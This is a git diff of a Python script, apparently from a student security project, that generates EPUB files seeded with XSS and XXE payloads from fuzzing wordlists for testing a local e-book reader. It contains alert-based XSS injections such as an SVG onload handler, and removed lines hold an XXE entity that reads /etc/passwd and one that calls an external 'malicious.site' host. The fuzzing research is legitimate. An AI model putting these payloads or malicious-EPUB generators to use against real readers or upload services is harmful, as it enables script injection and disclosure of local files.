@@ -8,14 +8,40 @@ from playwright.sync_api import sync_playwright
 # 配置路径
 # PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\XSS Injection\Intruders\xss_payloads_quick.txt"
 # PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
-PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XXE Injection\Intruders\XXE_Fuzzing.txt"
+# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XXE Injection\Intruders\XXE_Fuzzing.txt"
+PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
 
-BASE_DIR = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\epub_gen_data"
-OUTPUT_DIR = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\epub_gen_data\epub_gen"
+BASE_DIR = r".\epub_gen_data"
+OUTPUT_DIR = r".\epub_gen_data\epub_gen"
 TEMPLATE_DIR = os.path.join(BASE_DIR, "template")
 CAPTURE_DIR = os.path.join(BASE_DIR, "captured_payloads")  # 保存触发alert的payload
 # 修改为 examples/input.html 页面
 TEST_INTERFACE_URL = "http://localhost:8080/examples/input.html"  
+
+PayloadType = {
+        "OEBPS/Text.xhtml": [
+            "<!-- XSS_PAYLOAD -->",
+            "<!-- SVG_IMAGE_INJECTION -->",
+        ],
+        "OEBPS/cover.svg": [
+            "<rect ",  # SVG事件注入
+            "// SVG_SCRIPT_PAYLOAD",
+            "<!-- SVG_EVENT_PAYLOAD -->",
+        ],
+        "OEBPS/toc.xhtml": [
+            "<!-- MALICIOUS_LINK -->",
+            "<!-- XXE_INJECTION -->",
+            "<!-- XSS_INJECTION -->",
+        ],
+        "OEBPS/metadata.xml": [
+            "<!-- METADATA_TITLE -->",
+            "<!-- XML_PI_INJECTION -->",
+        ],
+        "OEBPS/content.opf": [
+            "<!-- TITLE_PAYLOAD -->", 
+            "<!-- TITLE_PAYLOAD -->", 
+        ]
+}
 
 
 def prepare_template():
@@ -80,6 +106,7 @@ def prepare_template():
     <title>Table of Contents</title>
 </head>
 <body>
+    <!-- XSS_INJECTION -->
     <nav epub:type="toc">
         <ol>
             <li><a href="Text.xhtml">Content</a></li>
@@ -115,7 +142,7 @@ def generate_malicious_epub(payload: str, index: int) -> list:
     # 定义所有注入点（新增SVG和XML注入点）
     injection_points = {
         "OEBPS/Text.xhtml": [
-            ("<!-- XSS_PAYLOAD -->", payload),
+            ("<!-- XSS_PAYLOAD -->", f'{payload}'),
             ("<!-- SVG_IMAGE_INJECTION -->",
             '''<svg/onload=alert(1)>''')
         ],
@@ -127,17 +154,13 @@ def generate_malicious_epub(payload: str, index: int) -> list:
             '<rect x="0" y="0" width="100" height="100" onclick="alert(1)"/>')
         ],
         "OEBPS/toc.xhtml": [
-            ("<!-- MALICIOUS_LINK -->", 
-             f'<li><a href="javascript:{payload}">Malicious Link</a></li>'),
-            ("</ol>",  # 新增XML外部实体注入
-             f'</ol>\n<!-- XML_INJECTION -->\n<!DOCTYPE test [\n'
-             f'<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n<test>&xxe;</test>')
+            ("<!-- MALICIOUS_LINK -->", f'{payload}'),
+            ("<!-- XXE_INJECTION -->",f'{payload}'),
+            ("<!-- XSS_INJECTION -->",f'{payload}'),
         ],
         "OEBPS/metadata.xml": [
-            ("NORMAL_TITLE", f"Test Book {payload}"),
-            ("<p>DESCRIPTION_PAYLOAD</p>", 
-             f'<p>{payload}</p>\n<?xml version="1.0" encoding="UTF-8"?>\n'
-             f'<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://malicious.site" >]>')
+            ("<!-- METADATA_TITLE -->", f"Test Book {payload}"),
+            ("<!-- XML_PI_INJECTION -->", f"{payload}")
         ],
         "OEBPS/content.opf": [
             ("<!-- TITLE_PAYLOAD -->", 
@@ -203,49 +226,6 @@ def generate_malicious_epub(payload: str, index: int) -> list:
 
 
 
-def test_epub_upload(epub_path: str, payload: str):
-    """使用Playwright测试EPUB上传并捕获alert消息"""
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True)
-        context = browser.new_context(accept_downloads=True)
-        page = context.new_page()
-
-        console_errors = []
-        alert_messages = []
-        page.on('console', lambda msg: console_errors.append(msg.text) if msg.type == 'error' else None)
-        page.on('dialog', lambda dialog: (alert_messages.append(dialog.message), dialog.dismiss()))
-
-        try:
-            print(f"🔗 测试接口访问: {TEST_INTERFACE_URL}")
-            page.goto(TEST_INTERFACE_URL)
-
-            # 直接通过 locator 设置文件
-            locator = page.locator('#input')
-            locator.set_input_files(epub_path)
-
-            page.wait_for_timeout(3000)
-
-            if alert_messages:
-                print(f"✅ Detected alert for payload [{payload}]: {alert_messages}")
-                # 保存截图到 CAPTURE_DIR，并命名为原 epub 文件名加 .png
-                base = os.path.splitext(os.path.basename(epub_path))[0]
-                screenshot_path = os.path.join(CAPTURE_DIR, f"{base}.png")
-                page.screenshot(path=screenshot_path)
-                print(f"📸 Screenshot saved: {screenshot_path}")
-                # 保存误用 payload 的 epub 文件
-                shutil.copy(epub_path, os.path.join(CAPTURE_DIR, os.path.basename(epub_path)))
-                
-            if console_errors:
-                print(f"❗ JS Errors: {console_errors}")
-
-
-        except Exception as e:
-            print(f"⚠ Test failed [{epub_path}]: {e}")
-        finally:
-            context.close()
-            browser.close()
-
-
 if __name__ == '__main__':
     os.makedirs(OUTPUT_DIR, exist_ok=True)
     prepare_template()
@@ -257,5 +237,3 @@ if __name__ == '__main__':
         print(f"🛠 Processing payload #{idx}: {payload[:50]}...")
         epub_file = generate_malicious_epub(payload, idx)
         print(f"✅ EPUB generated: {epub_file}")
-        test_epub_upload(epub_file, payload)
-        print()
